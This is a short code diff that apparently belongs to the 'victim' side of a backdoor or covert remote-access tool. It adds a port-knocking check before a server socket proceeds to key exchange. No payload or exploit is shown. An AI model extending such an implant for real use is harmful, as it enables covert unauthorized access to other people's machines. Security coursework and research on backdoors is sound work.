@@ -1,6 +1,7 @@
 import threading
 from victim_utils import *
 from victim_cryptography import *
+from port_knocking import *
 
 if __name__ == '__main__':
     # GetOpts arguments
@@ -10,6 +11,7 @@ if __name__ == '__main__':
     server_socket = initialize_server_socket(source_ip, source_port)
 
     # Perform Port Knocking
+    validate_port_knocking(source_port)
 
     # Generate Key Pair and Parameters + Serialize Public Key
     private_key, public_key, parameters = generate_keys_and_parameters()
